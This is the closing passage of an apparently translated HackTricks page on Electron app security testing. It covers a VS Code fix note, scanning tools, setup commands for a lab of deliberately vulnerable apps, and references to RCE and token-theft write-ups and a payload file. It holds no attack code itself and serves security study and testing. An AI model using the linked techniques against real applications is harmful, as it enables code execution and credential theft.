- Marekebisho ya Juni 3, 2026 yaliongeza `isTrusted` kwenye events zinazosambazwa, yalizima usambazaji wa vitufe visivyoaminika katika notebook webviews, na yaliacha kukubali install-command context iliyotolewa na caller.<sup>[[16]](#references)[[17]](#references)</sup>

## **Zana**

Mkusanyiko ulioratibiwa wa **awesome-electronjs-hacking** una nyenzo zaidi za utafiti, zana na programu zilizo hatarini.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) ni zana ya kutambua mipangilio isiyo sahihi na mifumo inayokiuka usalama katika programu zinazotumia Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ni plugin ya VS Code ya open source kwa programu za Electron inayotumia Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) hukagua maktaba za wahusika wengine zilizo hatarini.
- [**Electro.ng**](https://electro.ng/) ni zana ya kibiashara ya uchanganuzi wa usalama wa Electron.

## Maabara

Katika [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) unaweza kupata maabara ya kutumia vibaya programu za Electron zilizo hatarini.<sup>[[4]](#references)</sup>

Commands hizi zitakusaidia kupitia maabara:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Anwani iliyochapishwa awali kwa alamisho zilizopo: [Electron desktop apps](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Njia ya ukurasa mzima inaelekeza hapa; fragment ya kihistoria haidumishwi.

## References

- [1] [Phishing na ukusanyaji wa credentials katika programu za Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Kusoma faili zozote katika programu ya Facebook Messenger Desktop](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Kutumia vibaya ukosefu wa context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Warsha ya kudukua programu za kisasa za desktop kwa kutumia XSS na RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - orodha iliyochaguliwa ya nyenzo kuhusu (kutokuwa) salama kwa Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Matumizi mabaya ya Electron APIs: Chaguo la kwanza la mshambuliaji](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payloads za Electron nodeIntegration RCE](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE ya kubofya mara 1 katika programu za Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Hatari za Electron shell.openExternal() - njia nyingi za Remote Code Execution](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Ruhusu URL zozote, tarajia arbitrary code execution](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Kupata RCE katika zana maarufu ya mazungumzo ya Kijapani kwa kutumia kipengele cha Electron kilichopitwa na wakati](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Remote Code Execution](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Remote Code Execution katika Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Wizi wa tokeni ya GitHub kwa kubofya mara moja kupitia uingizaji wa matukio ya kibodi ya VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Suala la VS Code #319593: Webviews zinaweza kuanzisha mikato yoyote ya kibodi katika workbench kuu](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: thibitisha kufunguliwa kwa notebook na uache kukubali muktadha wa installExtension uliotolewa na caller](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: zuia usambazaji upya wa keypress/click za webview unaoanzishwa na programu katika notebook webviews](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / viendelezi vya workspace ya ndani](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Jinsi nilivyodukua kila IDE kuu ndani ya wiki 2](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Kumiliki programu maarufu za desktop huku nikifichua maeneo mapya ya mashambulizi katika Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Usalama wa Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Fanya reverse engineering ya chochote](https://github.com/morluto/rea)
- [24] [Uundaji upya wa artifacts za JavaScript wa REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Mtiririko wa kazi wa programu za JavaScript za cross-layer wa REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
